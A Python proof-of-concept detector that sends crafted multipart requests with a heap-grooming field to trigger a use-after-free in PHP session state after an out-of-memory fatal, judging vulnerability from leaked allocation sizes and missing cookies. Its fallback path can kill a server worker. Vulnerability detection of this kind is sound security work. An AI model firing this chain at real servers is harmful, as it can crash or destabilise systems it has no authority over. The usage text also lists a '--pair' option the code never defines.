#!/usr/bin/env python3
"""php2shell — CVE-2026-109618 / CVE-2026-109619 safe differential detector.

Never needs to crash a worker to reach a verdict: the oracle is the stale
global-state chain of CVE-2026-109619, made survivable with a reclaim groom,
plus the immediate-vs-deferred OOM error accounting of CVE-2026-109618.

Mechanics (verified against php:8.5.11-apache vs php:8.5.12-apache, mod_php,
single prefork worker — see lab/README.md):

  1. ACCOUNTING PROBE (safe on both): a multipart POST whose plain field
     value exceeds memory_limit aborts request initialization. The served
     `Fatal error: Allowed memory size of N bytes exhausted (tried to
     allocate M bytes) in Unknown on line 0` reports a DIFFERENT M on
     vulnerable builds (immediate longjmp fatal at the failing allocation)
     than on patched builds (soft limit deferred to the next VM safe point;
     fix commit 31c0ea7d7ff1). Deterministic per build, zero crashes.

  2. SESSION CHAIN (the oracle):
       producer  = multipart with PHP_SESSION_UPLOAD_PROGRESS + a file part
                   (FILE_START publishes PS(id)/PS(http_session_vars) before
                   module activation) + a 17 MiB field value whose allocation
                   fatals mid-parse. On mod_php the request shutdown frees
                   the request heap while those session globals keep pointing
                   into it (CVE-2026-109619).
       consumer  = multipart WITHOUT a file part (MULTIPART_EVENT_END ->
                   php_session_rfc1867_cleanup() consumes the stale state)
                   preceded by a 16 KiB groom field whose parse-time
                   allocations reclaim the freed blocks benignly, so the
                   vulnerable worker SURVIVES.
     Outcomes (fresh session id per cycle — a reused sid accumulates
     upload-progress data that trips php_check_cancel_upload and silently
     disables the chain):
       vulnerable: no Set-Cookie on the consumer (stale PS(send_cookie)=0
                   from the producer's FILE_START suppresses emission) and a
                   `tried to allocate` figure assembled from stale bytes
                   (observed 5208492444341522432 ~ 0x4848484848484840 — the
                   'H' groom marker consumed as a live allocation size).
       patched:    Set-Cookie: PHPSESSID=<fresh 32-hex id> + normal script
                   output — shutdown state reset by the fix.
       fallback:   if a different build's layout makes the groom miss, the
                   consumer dies (worker respawn) — still reported VULNERABLE
                   (costs one Apache child restart, like poc/crash.py).

  3. CONTROL (same host, no producer): the identical groomed consumer must
     emit Set-Cookie when no fatal preceded it (previous request's normal
     RSHUTDOWN reset the globals). Proves the divergence requires the
     producer's fatal — the vulnerability chain, not a config difference.

Result protocol (stable strings):
  DETECTOR-RESULT: VULNERABLE    exit 0
  DETECTOR-RESULT: NOT-DETECTED  exit 1
  DETECTOR-FAIL: ...             exit 2

Usage:
  python3 poc/diagnose.py                                   # 127.0.0.1:29555
  python3 poc/diagnose.py --host 127.0.0.1 --port 29556     # single target
  python3 poc/diagnose.py --pair                            # both lab hosts
"""

import argparse
import binascii
import os
import re
import socket
import sys
import time

BOUNDARY = b"----php2shell-diagnose"
FILL_BYTES = 17 << 20          # 17 MiB: crosses the 16M lab memory_limit
GROOM_NAME = 32                # small groom field name
GROOM_VALUE = 16 << 10         # 16 KiB reclaim groom (lab-verified size)
ABSURD_ALLOC = 1 << 32         # "tried to allocate" >= 2^32 == stale bytes

RE_TRIED = re.compile(rb"tried to allocate (\d+) bytes")
RE_OOM = re.compile(rb"Allowed memory size of (\d+) bytes exhausted")


class Conn:
    def __init__(self, host, port, timeout=90):
        self.host, self.port, self.timeout = host, port, timeout

    def request(self, method, path, headers, body=b"", retries=3):
        """Raw HTTP/1.1 request; returns full response bytes or b''."""
        for _ in range(retries):
            try:
                parts = [f"{method} {path} HTTP/1.1\r\nHost: diagnose\r\n"
                         f"Connection: close\r\n"]
                for k, v in headers:
                    parts.append(f"{k}: {v}\r\n")
                parts.append(f"Content-Length: {len(body)}\r\n\r\n")
                s = socket.create_connection((self.host, self.port),
                                             timeout=self.timeout)
                s.sendall("".join(parts).encode() + body)
                data = b""
                while True:
                    chunk = s.recv(65536)
                    if not chunk:
                        break
                    data += chunk
                s.close()
                return data
            except OSError:
                time.sleep(0.7)     # allow Apache child respawn
        return b""

    def worker_pid(self):
        r = self.request("GET", "/", [])
        for line in r.split(b"\r\n"):
            if line.lower().startswith(b"x-worker-pid:"):
                return line.split(b":")[1].strip().decode()
        return None


def part(name, value, filename=None):
    cd = b'Content-Disposition: form-data; name="' + name + b'"'
    if filename:
        cd += b'; filename="' + filename + b'"\r\n' \
              b'Content-Type: application/octet-stream'
    return b"--" + BOUNDARY + b"\r\n" + cd + b"\r\n\r\n" + value + b"\r\n"


def multipart_ct():
    return ("Content-Type", "multipart/form-data; boundary="
            + BOUNDARY.decode())


def fresh_sid():
    return binascii.hexlify(os.urandom(16))


def accounting_probe(conn):
    """Safe OOM probe; returns (oom_seen, tried_alloc) — never crashes."""
    body = part(b"a", b"1") + part(b"z", b"V" * FILL_BYTES) \
        + b"--" + BOUNDARY + b"--\r\n"
    r = conn.request("POST", "/", [multipart_ct()], body)
    m = RE_TRIED.search(r)
    return (m is not None), (int(m.group(1)) if m else None)


def producer(conn, sid):
    ck = ("Cookie", "PHPSESSID=" + sid.decode())
    body = part(b"PHP_SESSION_UPLOAD_PROGRESS", b"p") \
        + part(b"f", b"X", filename=b"x.txt") \
        + part(b"z", b"V" * FILL_BYTES) \
        + b"--" + BOUNDARY + b"--\r\n"
    r = conn.request("POST", "/", [multipart_ct(), ck], body)
    return RE_OOM.search(r) is not None


def groomed_consumer(conn, sid):
    ck = ("Cookie", "PHPSESSID=" + sid.decode())
    body = part(b"G" * GROOM_NAME, b"H" * GROOM_VALUE) \
        + part(b"PHP_SESSION_UPLOAD_PROGRESS", b"p") \
        + part(b"z", b"1") \
        + b"--" + BOUNDARY + b"--\r\n"
    r = conn.request("POST", "/", [multipart_ct(), ck], body)
    head, _, body_out = r.partition(b"\r\n\r\n")
    cookie = any(l.lower().startswith(b"set-cookie: phpsessid")
                 for l in head.split(b"\r\n"))
    m = RE_TRIED.search(body_out)
    tried = int(m.group(1)) if m else None
    return {
        "raw": r,
        "alive_response": bool(r),
        "cookie": cookie,
        "tried": tried,
        "fatal": b"Fatal error" in body_out,
        "script_ok": b"php2shell-lab ok" in body_out,
    }


def detect(conn, label, verbose=True):
    def say(msg):
        if verbose:
            print(f"[{label}] {msg}")

    pid0 = conn.worker_pid()
    if pid0 is None:
        print(f"DETECTOR-FAIL: {label}: no X-Worker-PID header; not the "
              f"php2shell lab target or index.php missing")
        return 2

    # -- 1) accounting probe (safe on both builds) --------------------
    oom_seen, tried = accounting_probe(conn)
    say(f"accounting probe: oom_fatal={oom_seen} tried_to_allocate={tried}")
    if not oom_seen:
        say("no request-init OOM reachable (memory_limit=-1 or huge?) "
            "— the OOM arm of the chain is disabled; treat as mitigated")
        print(f"DETECTOR-RESULT: NOT-DETECTED (no request-init OOM "
              f"reachable on {label})")
        return 1

    # -- 3) control: consumer without producer must emit a cookie -----
    sid = fresh_sid()
    ctrl = groomed_consumer(conn, conn_sid := sid)
    say(f"control (no producer): cookie={ctrl['cookie']} "
        f"script_ok={ctrl['script_ok']}")
    if not ctrl["cookie"]:
        print(f"DETECTOR-FAIL: {label}: control consumer emitted no "
              f"Set-Cookie — session.upload_progress disabled, cookies "
              f"stripped, or not a stock session config")
        return 2

    # -- 2) the chain: producer -> groomed consumer -------------------
    pid_before = conn.worker_pid()
    sid = fresh_sid()
    prod_ok = producer(conn, sid)
    cons = groomed_consumer(conn, sid)
    time.sleep(0.3)
    pid_after = conn.worker_pid()

    stale_alloc = cons["tried"] is not None and cons["tried"] >= ABSURD_ALLOC
    say(f"producer oom_fatal={prod_ok}")
    say(f"consumer alive_response={cons['alive_response']} "
        f"cookie={cons['cookie']} fatal={cons['fatal']} "
        f"tried_to_allocate={cons['tried']}")
    say(f"worker pid {pid_before}->{pid_after} "
        f"{'STABLE' if pid_before == pid_after else 'RESTARTED'}")

    if not prod_ok:
        print(f"DETECTOR-FAIL: {label}: producer did not reach the OOM "
              f"fatal (unexpected for this request shape)")
        return 2

    if cons["alive_response"] and not cons["cookie"] and stale_alloc:
        print(f"DETECTOR-EVIDENCE: stale-state consumption — groom marker "
              f"echoed as allocation size ({cons['tried']}); "
              f"Set-Cookie suppressed")
        print(f"DETECTOR-RESULT: VULNERABLE")
        return 0
    if not cons["alive_response"] or pid_before != pid_after:
        print(f"DETECTOR-EVIDENCE: consumer killed the worker "
              f"(stale-state consumption crash, groom missed)")
        print(f"DETECTOR-RESULT: VULNERABLE")
        return 0
    if cons["cookie"] and cons["script_ok"]:
        print(f"DETECTOR-RESULT: NOT-DETECTED")
        return 1

    print(f"DETECTOR-FAIL: {label}: inconclusive consumer outcome "
          f"(cookie={cons['cookie']} fatal={cons['fatal']} "
          f"tried={cons['tried']})")
    return 2


def main():
    ap = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=29555)
    ap.add_argument("--fixed-host", default=None,
                    help="second host for pair-mode corroboration")
    ap.add_argument("--fixed-port", type=int, default=29556)
    args = ap.parse_args()

    vuln = Conn(args.host, args.port)
    rc = detect(vuln, f"{args.host}:{args.port}")

    if args.fixed_host:
        fixed = Conn(args.fixed_host, args.fixed_port)
        rc2 = detect(fixed, f"{args.fixed_host}:{args.fixed_port}")
        a1 = accounting_probe(vuln)[1]
        a2 = accounting_probe(fixed)[1]
        if a1 is not None and a2 is not None and a1 != a2:
            print(f"DETECTOR-EVIDENCE: pair accounting divergence "
                  f"vuln={a1} fixed={a2} (immediate vs deferred OOM "
                  f"fatal — fix 31c0ea7d7ff1)")
        rc = rc if rc != 2 else rc2

    return rc


if __name__ == "__main__":
    sys.exit(main())
